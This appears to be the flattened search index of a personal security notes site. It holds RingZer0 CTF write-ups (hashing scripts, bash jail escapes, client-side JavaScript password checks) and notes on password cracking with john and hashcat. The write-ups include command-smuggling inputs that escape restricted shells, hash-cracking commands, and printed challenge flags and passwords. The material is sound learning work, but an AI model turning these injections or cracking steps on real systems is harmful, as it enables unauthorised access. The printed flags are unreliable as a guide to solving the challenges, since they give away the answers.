logged in, so I first browsed to the site using FireFox with the developer tools enabled. I collected the PHPSESSID cookie and sent it along with all of my get() requests. Hash Me Reloaded \u00b6 I initially thought that this challenge was simply a longer variant of Hash me Please designed to ensure that you couldn't do it manually. However, that wasn't the case. Further, I take a little issue with the instructions, because following them is not sufficient . Besides hashing the message, you need to first figure out (e.g. guess) that you need to convert the binary-string-looking message into ascii characters and then calculate the hash. Once you do that, the solution is very similar to the prior variant. My solution for this challenge was to modify the script I created for Hash Me Please alter it as follows: Once the message had been extracted and stripped (no extraneous whitespace chars), split the string into blocks of 8 digits convert each digit into an int map that each int to the ASCII table ( chr() in python) assemble the resulting characters into a string calculate and submit the hash of the resulting string I then manually submit the flag and collect my points. I Hate Mathematics \u00b6 This problem is fairly straight-forward, especially if you have your script developed for grabbing messages from the server and posting your answers. The math problem is presented in a consistent format and looks something like the following: 292 + 0x2408 - 1111000011011 = ? Where you have a decimal value plus a hex value and then subtract a binary. All you need to do is split the string into its compoent parts, convert the three \"numbers\" into ints using the proper base (10, 16, 2), perform the math, and submit the answer. This will provide you the flag value which you can then submit for points.","title":"Coding Challenges"},{"location":"ctf/rz-coding.html#coding-challenges","text":"","title":"Coding Challenges"},{"location":"ctf/rz-coding.html#hash-me-please","text":"In this challenge, you are presented with a \"message\" on a web page that you need to encode using sha512 and post to a URL within 2 seconds . Obviously, the primary task (encoding using sha512 ) isn't hard, but doing it within 2 seconds is designed to require that you write some code/script the operation rather than trying to copy/paste it into some online tool, generate the hash, and then post. I spent some time writing up a little python script that I hope will serve me well over a handful of challenges. Essentially, it does the following: requests the challenge page ( https://ringzer0ctf.com/challenges/13 ) parses the results and extracts the message text encodes the text using sha512 issues a get request to https://ringzer0ctf.com/challenges/13/<generated_hash> parse the results of that get() and extracts the flag I then manually submit the flag and collect my points. Note I assumed I needed to do this all while logged in, so I first browsed to the site using FireFox with the developer tools enabled. I collected the PHPSESSID cookie and sent it along with all of my get() requests.","title":"Hash Me Please"},{"location":"ctf/rz-coding.html#hash-me-reloaded","text":"I initially thought that this challenge was simply a longer variant of Hash me Please designed to ensure that you couldn't do it manually. However, that wasn't the case. Further, I take a little issue with the instructions, because following them is not sufficient . Besides hashing the message, you need to first figure out (e.g. guess) that you need to convert the binary-string-looking message into ascii characters and then calculate the hash. Once you do that, the solution is very similar to the prior variant. My solution for this challenge was to modify the script I created for Hash Me Please alter it as follows: Once the message had been extracted and stripped (no extraneous whitespace chars), split the string into blocks of 8 digits convert each digit into an int map that each int to the ASCII table ( chr() in python) assemble the resulting characters into a string calculate and submit the hash of the resulting string I then manually submit the flag and collect my points.","title":"Hash Me Reloaded"},{"location":"ctf/rz-coding.html#i-hate-mathematics","text":"This problem is fairly straight-forward, especially if you have your script developed for grabbing messages from the server and posting your answers. The math problem is presented in a consistent format and looks something like the following: 292 + 0x2408 - 1111000011011 = ? Where you have a decimal value plus a hex value and then subtract a binary. All you need to do is split the string into its compoent parts, convert the three \"numbers\" into ints using the proper base (10, 16, 2), perform the math, and submit the answer. This will provide you the flag value which you can then submit for points.","title":"I Hate Mathematics"},{"location":"ctf/rz-jailescape.html","text":"Jail Escaping \u00b6 Bash Jail 1 \u00b6 First of this type of challenge. SSH into a machine with given credentials, and you are entered into a limited shell. In this case, you are provided a basic example of what is going on, so you have some idea of how to get out. You see something like the following: RingZer0 Team Online CTF BASH Jail Level 1 : Current user is uid = 1000 ( level1 ) gid = 1000 ( level1 ) groups = 1000 ( level1 ) Flag is located at /home/level1/flag.txt Challenge bash code: ----------------------------- while : do echo \"Your input:\" read input output = ` $input ` done ----------------------------- Your input: There are better ways to solve this, but all I did was the following: // provide /bin/bash as my \"input\" : ) /bin/bash bash: FLAG-U96l4k6m72a051GgE5EN0rA85499172K: command not found level1@lxc17-bash-jail:~$ And you have the flag which you can then submit and collect your points. Note I knew I was missing something here, so I read a writeup or two after I submitted mine. The key was the supression of stdout. One example I saw had you simply submitting bash , and then using ls 1>&2 followed by cat flag.txt 1>&2 to get the goods. This was the \"niceness\" that I was hoping for. Bash Jail 2 \u00b6 This one was a little harder, but not too bad. This is what the \"jail\" looked like: function check_space { if [[ $1 == * [ bdks ';''&'' ' ] * ]] then return 0 fi return 1 } while : do echo \"Your input:\" read input if check_space \" $input \" then echo -e '\\033[0;31mRestricted characters has been used\\033[0m' else output = \"echo Your command is: $input \" eval $output fi done I did some testing/experimentation, and finally settled on the following input: $( <flag.txt ) Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P Which seems both simple and elegant at the same time. With this, you can submit the flag and claim your points.","title":"Jail Escapes"},{"location":"ctf/rz-jailescape.html#jail-escaping","text":"","title":"Jail Escaping"},{"location":"ctf/rz-jailescape.html#bash-jail-1","text":"First of this type of challenge. SSH into a machine with given credentials, and you are entered into a limited shell. In this case, you are provided a basic example of what is going on, so you have some idea of how to get out. You see something like the following: RingZer0 Team Online CTF BASH Jail Level 1 : Current user is uid = 1000 ( level1 ) gid = 1000 ( level1 ) groups = 1000 ( level1 ) Flag is located at /home/level1/flag.txt Challenge bash code: ----------------------------- while : do echo \"Your input:\" read input output = ` $input ` done ----------------------------- Your input: There are better ways to solve this, but all I did was the following: // provide /bin/bash as my \"input\" : ) /bin/bash bash: FLAG-U96l4k6m72a051GgE5EN0rA85499172K: command not found level1@lxc17-bash-jail:~$ And you have the flag which you can then submit and collect your points. Note I knew I was missing something here, so I read a writeup or two after I submitted mine. The key was the supression of stdout. One example I saw had you simply submitting bash , and then using ls 1>&2 followed by cat flag.txt 1>&2 to get the goods. This was the \"niceness\" that I was hoping for.","title":"Bash Jail 1"},{"location":"ctf/rz-jailescape.html#bash-jail-2","text":"This one was a little harder, but not too bad. This is what the \"jail\" looked like: function check_space { if [[ $1 == * [ bdks ';''&'' ' ] * ]] then return 0 fi return 1 } while : do echo \"Your input:\" read input if check_space \" $input \" then echo -e '\\033[0;31mRestricted characters has been used\\033[0m' else output = \"echo Your command is: $input \" eval $output fi done I did some testing/experimentation, and finally settled on the following input: $( <flag.txt ) Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P Which seems both simple and elegant at the same time. With this, you can submit the flag and claim your points.","title":"Bash Jail 2"},{"location":"ctf/rz-javascript.html","text":"JavaScript \u00b6 Client Side Validation Is Bad! \u00b6 This is an easy challenge that I actually worked through while sitting on a conference call. The premise is that (unfortunately) many websites embed too much logic on the client that gives away information that shouldn't be. You are presented with a password login form that takes a username/password. Utilizing the in-built browser developer tools, you can see a block of JavaScript code that looks like the following: // Look's like weak JavaScript auth script :) $ ( \".c_submit\" ). click ( function ( event ) { event . preventDefault () var u = $ ( \"#cuser\" ). val (); var p = $ ( \"#cpass\" ). val (); if ( u == \"admin\" && p == String . fromCharCode ( 74 , 97 , 118 , 97 , 83 , 99 , 114 , 105 , 112 , 116 , 73 , 115 , 83 , 101 , 99 , 117 , 114 , 101 )) { if ( document . location . href . indexOf ( \"?p=\" ) == - 1 ) { document . location = document . location . href + \"?p=\" + p ; } } else { $ ( \"#cresponse\" ). html ( \"<div class='alert alert-danger'>Wrong password sorry.</div>\" ); } }); And yes, the comment about weak JavaScript auth is part of the page (I didn't add it). A little bit of reading shows that the expected username is admin and they attempt to be clever by encoding the password. Lots of ways to decode this, but if you copy that string and drop it into JSFiddle , you can drop the results into a variable, display them, and see that the expected password is JavaScriptIsSecure . Entering these values causes the page to present the flag which can then be entered to collect your points. Hashing Is More Secure \u00b6 This is quite similar to the prior JavaScript challenge, but only has a password field. If you inspect the code on this page, you'll see that rather than encoded as the int variant of ASCII chars, the password against which the checks are performed is hashed via sha1 . if ( Sha1 . hash ( p ) == \"b89356ff6151527e89c4f3e3d30c8e6586c63962\" ) { if ( document . location . href . indexOf ( \"?p=\" ) == - 1 ) { document . location = document . location . href + \"?p=\" + p ; } } Again, there are many ways to unroll this, but I used John as it was easy. # store the hash in a file called hash.txt $ echo \"b89356ff6151527e89c4f3e3d30c8e6586c63962\" >> hash.txt # attempt to crack $ john hash.txt ... adminz ... Submit the form with that password and you'll be presented with the flag which you can then submit to collect your points. Then Obfuscation Is More Secure \u00b6 In a continuing theme from the password forms, we have another client-side password validation routine but this time the code is \"obfuscated\". // Look's like weak JavaScript auth script :) var _0xc360 = [ \"\\x76\\x61\\x6C\" , \"\\x23\\x63\\x70\\x61\\x73\\x73\" , \"\\x61\\x6C\\x6B\\x33\" , \"\\x30\\x32\\x6C\\x31\" , \"\\x3F\\x70\\x3D\" , \"\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\" , \"\\x68\\x72\\x65\\x66\" , \"\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x27\\x65\\x72\\x72\\x6F\\x72\\x27\\x3E\\x57\\x72\\x6F\\x6E\\x67\\x20\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\\x20\\x73\\x6F\\x72\\x72\\x79\\x2E\\x3C\\x2F\\x64\\x69\\x76\\x3E\" , \"\\x68\\x74\\x6D\\x6C\" , \"\\x23\\x63\\x72\\x65\\x73\\x70\\x6F\\x6E\\x73\\x65\" , \"\\x63\\x6C\\x69\\x63\\x6B\" , \"\\x2E\\x63\\x5F\\x73\\x75\\x62\\x6D\\x69\\x74\" ]; $ ( _0xc360 [ 12 ])[ _0xc360 [ 11 ]]( function (){ var _0xf382x1 = $ ( _0xc360 [ 1 ])[ _0xc360 [ 0 ]](); var _0xf382x2 = _0xc360 [ 2 ]; if ( _0xf382x1 == _0xc360 [ 3 ] + _0xf382x2 ){ if ( document [ _0xc360 [ 7 ]][ _0xc360 [ 6 ]][ _0xc360 [ 5 ]]( _0xc360 [ 4 ]) ==- 1 ){ document [ _0xc360 [ 7 ]] = document [ _0xc360 [ 7 ]][ _0xc360 [ 6 ]] + _0xc360 [ 4 ] + _0xf382x1 ;} ;} else { $ ( _0xc360 [ 10 ])[ _0xc360 [ 9 ]]( _0xc360 [ 8 ]);} ;} ); We could write our own little script to unwrap this, but if we hop over to lelinhtinh's little JavaScript Deobfuscator and Unpacker , we see the following: var _0xc360 = [ \"val\" , \"#cpass\" , \"alk3\" , \"02l1\" , \"?p=\" , \"indexOf\" , \"href\" , \"location\" , \"<div class=\\'error\\'>Wrong password sorry.</div>\" , \"html\" , \"#cresponse\" , \"click\" , \".c_submit\" ]; $ ( _0xc360 [ 12 ])[ _0xc360 [ 11 ]]( function () { var _0xf382x1 = $ ( _0xc360 [ 1 ])[ _0xc360 [ 0 ]](); var _0xf382x2 = _0xc360 [ 2 ]; if ( _0xf382x1 == _0xc360 [ 3 ] + _0xf382x2 ) { if ( document [ _0xc360 [ 7 ]][ _0xc360 [ 6 ]][ _0xc360 [ 5 ]]( _0xc360 [ 4 ]) == - 1 ) { document [ _0xc360 [ 7 ]] = document [ _0xc360 [ 7 ]][ _0xc360 [ 6 ]] + _0xc360 [ 4 ] + _0xf382x1 ; }; } else { $ ( _0xc360 [ 10 ])[ _0xc360 [ 9 ]]( _0xc360 [ 8 ]); }; }); // excerpt var _0xf382x2 = _0xc360 [ 2 ]; if ( _0xf382x1 == _0xc360 [ 3 ] + _0xf382x2 ) { // translate based on the array above if ( _0xf382x1 == \"02l1\" + \"alk3\" ) { // or, more nicely if ( _0xf382x1 == \"02l1alk3\" ) { That conditional looks an awful lot like the password comparison we've seen before. Sure enough, if you submit the password of 02l1alk3 you will be presented with the flag that you can then submit and collect your points.","title":"Javascript"},{"location":"ctf/rz-javascript.html#javascript","text":"","title":"JavaScript"},{"location":"ctf/rz-javascript.html#client-side-validation-is-bad","text":"This is an easy challenge that I actually worked through while sitting on a conference call. The premise is that (unfortunately) many websites embed too much logic on the client that gives away information that shouldn't be. You are presented with a password login form that takes a username/password. Utilizing the in-built browser developer tools, you can see a block of JavaScript code that looks like the following: // Look's like weak JavaScript auth script :) $ ( \".c_submit\" ). click ( function ( event ) { event . preventDefault () var u = $ ( \"#cuser\" ). val (); var p = $ ( \"#cpass\" ). val (); if ( u == \"admin\" && p == String . fromCharCode ( 74 , 97 , 118 , 97 , 83 , 99 , 114 , 105 , 112 , 116 , 73 , 115 , 83 , 101 , 99 , 117 , 114 , 101 )) { if ( document . location . href . indexOf ( \"?p=\" ) == - 1 ) { document . location = document . location . href + \"?p=\" + p ; } } else { $ ( \"#cresponse\" ). html ( \"<div class='alert alert-danger'>Wrong password sorry.</div>\" ); } }); And yes, the comment about weak JavaScript auth is part of the page (I didn't add it). A little bit of reading shows that the expected username is admin and they attempt to be clever by encoding the password. Lots of ways to decode this, but if you copy that string and drop it into JSFiddle , you can drop the results into a variable, display them, and see that the expected password is JavaScriptIsSecure . Entering these values causes the page to present the flag which can then be entered to collect your points.","title":"Client Side Validation Is Bad!"},{"location":"ctf/rz-javascript.html#hashing-is-more-secure","text":"This is quite similar to the prior JavaScript challenge, but only has a password field. If you inspect the code on this page, you'll see that rather than encoded as the int variant of ASCII chars, the password against which the checks are performed is hashed via sha1 . if ( Sha1 . hash ( p ) == \"b89356ff6151527e89c4f3e3d30c8e6586c63962\" ) { if ( document . location . href . indexOf ( \"?p=\" ) == - 1 ) { document . location = document . location . href + \"?p=\" + p ; } } Again, there are many ways to unroll this, but I used John as it was easy. # store the hash in a file called hash.txt $ echo \"b89356ff6151527e89c4f3e3d30c8e6586c63962\" >> hash.txt # attempt to crack $ john hash.txt ... adminz ... Submit the form with that password and you'll be presented with the flag which you can then submit to collect your points.","title":"Hashing Is More Secure"},{"location":"ctf/rz-javascript.html#then-obfuscation-is-more-secure","text":"In a continuing theme from the password forms, we have another client-side password validation routine but this time the code is \"obfuscated\". // Look's like weak JavaScript auth script :) var _0xc360 = [ \"\\x76\\x61\\x6C\" , \"\\x23\\x63\\x70\\x61\\x73\\x73\" , \"\\x61\\x6C\\x6B\\x33\" , \"\\x30\\x32\\x6C\\x31\" , \"\\x3F\\x70\\x3D\" , \"\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\" , \"\\x68\\x72\\x65\\x66\" , \"\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x27\\x65\\x72\\x72\\x6F\\x72\\x27\\x3E\\x57\\x72\\x6F\\x6E\\x67\\x20\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\\x20\\x73\\x6F\\x72\\x72\\x79\\x2E\\x3C\\x2F\\x64\\x69\\x76\\x3E\" , \"\\x68\\x74\\x6D\\x6C\" , \"\\x23\\x63\\x72\\x65\\x73\\x70\\x6F\\x6E\\x73\\x65\" , \"\\x63\\x6C\\x69\\x63\\x6B\" , \"\\x2E\\x63\\x5F\\x73\\x75\\x62\\x6D\\x69\\x74\" ]; $ ( _0xc360 [ 12 ])[ _0xc360 [ 11 ]]( function (){ var _0xf382x1 = $ ( _0xc360 [ 1 ])[ _0xc360 [ 0 ]](); var _0xf382x2 = _0xc360 [ 2 ]; if ( _0xf382x1 == _0xc360 [ 3 ] + _0xf382x2 ){ if ( document [ _0xc360 [ 7 ]][ _0xc360 [ 6 ]][ _0xc360 [ 5 ]]( _0xc360 [ 4 ]) ==- 1 ){ document [ _0xc360 [ 7 ]] = document [ _0xc360 [ 7 ]][ _0xc360 [ 6 ]] + _0xc360 [ 4 ] + _0xf382x1 ;} ;} else { $ ( _0xc360 [ 10 ])[ _0xc360 [ 9 ]]( _0xc360 [ 8 ]);} ;} ); We could write our own little script to unwrap this, but if we hop over to lelinhtinh's little JavaScript Deobfuscator and Unpacker , we see the following: var _0xc360 = [ \"val\" , \"#cpass\" , \"alk3\" , \"02l1\" , \"?p=\" , \"indexOf\" , \"href\" , \"location\" , \"<div class=\\'error\\'>Wrong password sorry.</div>\" , \"html\" , \"#cresponse\" , \"click\" , \".c_submit\" ]; $ ( _0xc360 [ 12 ])[ _0xc360 [ 11 ]]( function () { var _0xf382x1 = $ ( _0xc360 [ 1 ])[ _0xc360 [ 0 ]](); var _0xf382x2 = _0xc360 [ 2 ]; if ( _0xf382x1 == _0xc360 [ 3 ] + _0xf382x2 ) { if ( document [ _0xc360 [ 7 ]][ _0xc360 [ 6 ]][ _0xc360 [ 5 ]]( _0xc360 [ 4 ]) == - 1 ) { document [ _0xc360 [ 7 ]] = document [ _0xc360 [ 7 ]][ _0xc360 [ 6 ]] + _0xc360 [ 4 ] + _0xf382x1 ; }; } else { $ ( _0xc360 [ 10 ])[ _0xc360 [ 9 ]]( _0xc360 [ 8 ]); }; }); // excerpt var _0xf382x2 = _0xc360 [ 2 ]; if ( _0xf382x1 == _0xc360 [ 3 ] + _0xf382x2 ) { // translate based on the array above if ( _0xf382x1 == \"02l1\" + \"alk3\" ) { // or, more nicely if ( _0xf382x1 == \"02l1alk3\" ) { That conditional looks an awful lot like the password comparison we've seen before. Sure enough, if you submit the password of 02l1alk3 you will be presented with the flag that you can then submit and collect your points.","title":"Then Obfuscation Is More Secure"},{"location":"ctf/rz-xdata.html","text":"Exotic Data Storage \u00b6 File recovery \u00b6 For this challenge, you were presented with a zip archive containing two files: flag.enc and private.pem . This immediately looked like a simple decryption problem. Looking up my command-line reference, I ran the following commands: $ openssl rsautl -decrypt -in flag.enc -out flag.txt -inkey private.pem $ cat flag.txt I then submitted the contents of flag.txt and was awarded my one point.","title":"Exotic Data Storage"},{"location":"ctf/rz-xdata.html#exotic-data-storage","text":"","title":"Exotic Data Storage"},{"location":"ctf/rz-xdata.html#file-recovery","text":"For this challenge, you were presented with a zip archive containing two files: flag.enc and private.pem . This immediately looked like a simple decryption problem. Looking up my command-line reference, I ran the following commands: $ openssl rsautl -decrypt -in flag.enc -out flag.txt -inkey private.pem $ cat flag.txt I then submitted the contents of flag.txt and was awarded my one point.","title":"File recovery"},{"location":"ctf/rzeroctf.html","text":"Ring Zero CTF \u00b6 I stumbled on this site and thought it might be helpful in testing some basic CTF-style activities and serve as an gentle entryway into the sport. This page contains some of my notes collected while working through some of their challenges. Topics \u00b6 Coding Challenges Exotic Data Storage Jail Escapes Javascript Future Topics \u00b6 Cryptography Forensics Malware Analysis Pwnage Linux Reverse Engineering Shellcoding Software Defined Radio SQL Injection Steganography SysAdmin Linux The NC8 Reverse Engineering Track Web Warning","title":"Overview"},{"location":"ctf/rzeroctf.html#ring-zero-ctf","text":"I stumbled on this site and thought it might be helpful in testing some basic CTF-style activities and serve as an gentle entryway into the sport. This page contains some of my notes collected while working through some of their challenges.","title":"Ring Zero CTF"},{"location":"ctf/rzeroctf.html#topics","text":"Coding Challenges Exotic Data Storage Jail Escapes Javascript","title":"Topics"},{"location":"ctf/rzeroctf.html#future-topics","text":"Cryptography Forensics Malware Analysis Pwnage Linux Reverse Engineering Shellcoding Software Defined Radio SQL Injection Steganography SysAdmin Linux The NC8 Reverse Engineering Track Web Warning","title":"Future Topics"},{"location":"linux/lfs.html","text":"Linux From Scratch \u00b6 \"Persistence makes all the difference (and a high frustration threshold certainly helps). As in all endeavors, learning from mistakes is critically important. Each misstep, every failure contributes to the body of knowledge that will lead to mastery of the art of building software .\" (from https://tldp.org/ ) Started 13 December 2021 Working on version 11.0, published 01 September 2021 Plan is to work through the book taking the \"default\" paths at each choice (64-bit, x64). Will consider the systemd variant as well as the multilib (32/64) option later ( https://www.linuxfromscratch.org/~thomas/multilib/index.html ). Based on the Forward, I read this: https://tldp.org/HOWTO/Software-Building-HOWTO.html . I'm not sure I learned anything really new, but it exposed me to some history re: building software for Linux (1999). I did skim through the examples (section 9-13) as they were so dated as to likely not provide significant value. Another forward-inspired read: http://moi.vonos.net/linux/beginners-installing-from-source/ . This was approximately 15 years newer, but still 6+ years old. I apreciated the discussion of configure and make as well as Makefile.in and autotools . I also like the explanation/justification for the ./build directory (keeping src dir clean). To Investigate Further: \u00b6 setuid root ; chmod u+s filename","title":"Linux From Scratch"},{"location":"linux/lfs.html#linux-from-scratch","text":"\"Persistence makes all the difference (and a high frustration threshold certainly helps). As in all endeavors, learning from mistakes is critically important. Each misstep, every failure contributes to the body of knowledge that will lead to mastery of the art of building software .\" (from https://tldp.org/ ) Started 13 December 2021 Working on version 11.0, published 01 September 2021 Plan is to work through the book taking the \"default\" paths at each choice (64-bit, x64). Will consider the systemd variant as well as the multilib (32/64) option later ( https://www.linuxfromscratch.org/~thomas/multilib/index.html ). Based on the Forward, I read this: https://tldp.org/HOWTO/Software-Building-HOWTO.html . I'm not sure I learned anything really new, but it exposed me to some history re: building software for Linux (1999). I did skim through the examples (section 9-13) as they were so dated as to likely not provide significant value. Another forward-inspired read: http://moi.vonos.net/linux/beginners-installing-from-source/ . This was approximately 15 years newer, but still 6+ years old. I apreciated the discussion of configure and make as well as Makefile.in and autotools . I also like the explanation/justification for the ./build directory (keeping src dir clean).","title":"Linux From Scratch"},{"location":"linux/lfs.html#to-investigate-further","text":"setuid root ; chmod u+s filename","title":"To Investigate Further:"},{"location":"skills/webexploit.html","text":"Web Site Exploitation \u00b6 BurpSuite \u00b6 OWASP Zed Attack Proxy (ZAP) \u00b6 https://owasp.org/www-project-zap/ https://www.zaproxy.org/getting-started/ Helpful: Software security testing is the process of assessing and testing a system to discover security risks and vulnerabilities of the system and its data. There is no universal terminology but for our purposes, we define assessments as the analysis and discovery of vulnerabilities without attempting to actually exploit those vulnerabilities. We define testing as the discovery and attempted exploitation of vulnerabilities. https://www.zaproxy.org/getting-started/ this looks helpful https://www.zaproxy.org/zap-deep-dive/ a tool for finding vulnerabilities in web application projects Dynamic application security testing tool (DAST)... not a static analyzer # automatically listening on port 8080 ./zap.sh -daemon # scan via the cmdline ./zap.sh -cmd -quickurl http://localhost:8080/bodgeit -quickprogress","title":"Website Exploitation"},{"location":"skills/webexploit.html#web-site-exploitation","text":"","title":"Web Site Exploitation"},{"location":"skills/webexploit.html#burpsuite","text":"","title":"BurpSuite"},{"location":"skills/webexploit.html#owasp-zed-attack-proxy-zap","text":"https://owasp.org/www-project-zap/ https://www.zaproxy.org/getting-started/ Helpful: Software security testing is the process of assessing and testing a system to discover security risks and vulnerabilities of the system and its data. There is no universal terminology but for our purposes, we define assessments as the analysis and discovery of vulnerabilities without attempting to actually exploit those vulnerabilities. We define testing as the discovery and attempted exploitation of vulnerabilities. https://www.zaproxy.org/getting-started/ this looks helpful https://www.zaproxy.org/zap-deep-dive/ a tool for finding vulnerabilities in web application projects Dynamic application security testing tool (DAST)... not a static analyzer # automatically listening on port 8080 ./zap.sh -daemon # scan via the cmdline ./zap.sh -cmd -quickurl http://localhost:8080/bodgeit -quickprogress","title":"OWASP Zed Attack Proxy (ZAP)"},{"location":"skills/assembly/ppc.html","text":"PowerPC \u00b6 Cheat Sheets/Helpers \u00b6 https://devblogs.microsoft.com/oldnewthing/20180806-00/?p=99425 http://www.tentech.ca/downloads/other/PPC_Quick_Ref_Card-Rev1_Oct12_2010.pdf https://cr.yp.to/2005-590/powerpc-cwg.pdf (Appendix A) Examples \u00b6","title":"PowerPC"},{"location":"skills/assembly/ppc.html#powerpc","text":"","title":"PowerPC"},{"location":"skills/assembly/ppc.html#cheat-sheetshelpers","text":"https://devblogs.microsoft.com/oldnewthing/20180806-00/?p=99425 http://www.tentech.ca/downloads/other/PPC_Quick_Ref_Card-Rev1_Oct12_2010.pdf https://cr.yp.to/2005-590/powerpc-cwg.pdf (Appendix A)","title":"Cheat Sheets/Helpers"},{"location":"skills/assembly/ppc.html#examples","text":"","title":"Examples"},{"location":"skills/languages/cpp.html","text":"C++ \u00b6","title":"C++"},{"location":"skills/languages/cpp.html#c","text":"","title":"C++"},{"location":"skills/passwords/index.html","text":"Password Cracking \u00b6 There's a ton of work occuring in the password cracking space. In general, however, the problem is pretty simple. Given a hash of the password (and hopefully the salt), try a number of different values (with mutations) to see if you can create the same hash. If you do, then you know the original password. In this way, it isn't so much about cracking the password as it is about guessing it. I've tried a few tools and will document here some notes on using them. This is not a definitive list, and there are many other approaches. These are just the ones I've used. Examples \u00b6 First, we need some safe examples to play with. The first example uses the older-style MD5 based BSD password algorithm that is used by some older/more limited variants of linux. You can see them stored in /etc/passwd or /etc/shadow in the form of $1$user_specifc_salt$user_password_hash where the $ is the delimiter and the value 1 indicates the MD5-based hash in the form of salt$password . In more modern systems you might see values of 6 which indicates a sha-512 based hash. Thankfully, we can easily recreate an example hash as follows: # given: user-specific salt of \"mysalthere\" # given: user password of \"pass1word\" # # create the hash version $ openssl passwd -1 -salt mysalthere pass1word $1$mysalthe$CzBJwN4eH504pWE9 /g8ug. # additionally, we can create the more-modern variant that utilizes the # sha-512 algorithm $ openssl passwd -6 -salt mysalthere pass1word $6$mysalthere$V7n5N7SpCKyPt15fW3uKvRS51cLHH8TV8 /RKA0DhHuzxZKbpkLDS7eciImIkzgG3cbrkSHonb3b2PQiANaF6X/ Given this, we'll put the first hash in a file called hash.md5 and the second hash.sha512 . These will be our test examples for the two tools we are looking at. Word Lists \u00b6 Unless you have a magic list of starting words that you've curated over the years, you'll likely need a word list. There are tons available online - some free, others require payment. Some even come shipped by default in security-focused distros like Kali ( /usr/share/wordlists/ ). Here I'll use the famous \"rockyou\" list... its available online wherever good word lists are found ... Iterations \u00b6 asdfasdf Salts \u00b6 asdfasdfasdf System Overview \u00b6 Device #1 : NVIDIA GeForce RTX 2080 Ti, 10859/11019 MB, 68MCU Device #2 : NVIDIA GeForce RTX 2080 Ti, 10741/10997 MB, 68MCU $ ./hashcat.bin -O -m 1800 -w 4 -b hashcat (v6.2.4) starting in benchmark mode Benchmark relevant options: =========================== * --optimized-kernel-enable * --workload-profile=4 -------------------------------------------------------------------- * Hash-Mode 1800 (sha512crypt $6$, SHA512 (Unix)) [Iterations: 5000] -------------------------------------------------------------------- Speed.#1.........: 303.6 kH/s (169.65ms) @ Accel:8192 Loops:1024 Thr:32 Vec:1 Speed.#2.........: 357.1 kH/s (144.11ms) @ Accel:8192 Loops:1024 Thr:32 Vec:1 Speed.#*.........: 660.7 kH/s https://pthree.org/2018/05/23/do-not-use-sha256crypt-sha512crypt-theyre-dangerous/","title":"Overview"},{"location":"skills/passwords/index.html#password-cracking","text":"There's a ton of work occuring in the password cracking space. In general, however, the problem is pretty simple. Given a hash of the password (and hopefully the salt), try a number of different values (with mutations) to see if you can create the same hash. If you do, then you know the original password. In this way, it isn't so much about cracking the password as it is about guessing it. I've tried a few tools and will document here some notes on using them. This is not a definitive list, and there are many other approaches. These are just the ones I've used.","title":"Password Cracking"},{"location":"skills/passwords/index.html#examples","text":"First, we need some safe examples to play with. The first example uses the older-style MD5 based BSD password algorithm that is used by some older/more limited variants of linux. You can see them stored in /etc/passwd or /etc/shadow in the form of $1$user_specifc_salt$user_password_hash where the $ is the delimiter and the value 1 indicates the MD5-based hash in the form of salt$password . In more modern systems you might see values of 6 which indicates a sha-512 based hash. Thankfully, we can easily recreate an example hash as follows: # given: user-specific salt of \"mysalthere\" # given: user password of \"pass1word\" # # create the hash version $ openssl passwd -1 -salt mysalthere pass1word $1$mysalthe$CzBJwN4eH504pWE9 /g8ug. # additionally, we can create the more-modern variant that utilizes the # sha-512 algorithm $ openssl passwd -6 -salt mysalthere pass1word $6$mysalthere$V7n5N7SpCKyPt15fW3uKvRS51cLHH8TV8 /RKA0DhHuzxZKbpkLDS7eciImIkzgG3cbrkSHonb3b2PQiANaF6X/ Given this, we'll put the first hash in a file called hash.md5 and the second hash.sha512 . These will be our test examples for the two tools we are looking at.","title":"Examples"},{"location":"skills/passwords/index.html#word-lists","text":"Unless you have a magic list of starting words that you've curated over the years, you'll likely need a word list. There are tons available online - some free, others require payment. Some even come shipped by default in security-focused distros like Kali ( /usr/share/wordlists/ ). Here I'll use the famous \"rockyou\" list... its available online wherever good word lists are found ...","title":"Word Lists"},{"location":"skills/passwords/index.html#iterations","text":"asdfasdf","title":"Iterations"},{"location":"skills/passwords/index.html#salts","text":"asdfasdfasdf","title":"Salts"},{"location":"skills/passwords/index.html#system-overview","text":"Device #1 : NVIDIA GeForce RTX 2080 Ti, 10859/11019 MB, 68MCU Device #2 : NVIDIA GeForce RTX 2080 Ti, 10741/10997 MB, 68MCU $ ./hashcat.bin -O -m 1800 -w 4 -b hashcat (v6.2.4) starting in benchmark mode Benchmark relevant options: =========================== * --optimized-kernel-enable * --workload-profile=4 -------------------------------------------------------------------- * Hash-Mode 1800 (sha512crypt $6$, SHA512 (Unix)) [Iterations: 5000] -------------------------------------------------------------------- Speed.#1.........: 303.6 kH/s (169.65ms) @ Accel:8192 Loops:1024 Thr:32 Vec:1 Speed.#2.........: 357.1 kH/s (144.11ms) @ Accel:8192 Loops:1024 Thr:32 Vec:1 Speed.#*.........: 660.7 kH/s https://pthree.org/2018/05/23/do-not-use-sha256crypt-sha512crypt-theyre-dangerous/","title":"System Overview"},{"location":"skills/passwords/hashcat.html","text":"HashCat \u00b6 HashCat has alot of options. It is really worth taking time to read through the docs if you want to actually use the tool productively. Tip If you want to keep an eye on your NVIDIA GPUs while they are busy cracking passwords, you can get the equivalent of htop running a command similar to the following: $ watch -d -n 0.5 nvidia-smi . In this case it runs the nvidia-smi utility every half second ( -n 0.5 ), leaves it \"in place\" ( watch ) (so your screen isn't constantly scrolling) and higlights the values that change between refreshes ( -d ) Random Notes to be incorporated \u00b6 the pattern-based approach is called a \"mask attack\" - more info is available here: https://hashcat.net/wiki/doku.php?id=mask_attack we might want to create custom word-lists: https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/ I did some testing to compare, and (where appropriate), it seems that the mask-attack is more performant (hashes/sec) than a wordlist (though it might not be successful). using a non-optimized command (`$ ./hascat.bin -m 1800 hash2 rockyou.txt) exhausted the list in 12:08 at a rate of roughly 19,706 H/s using an optimized command 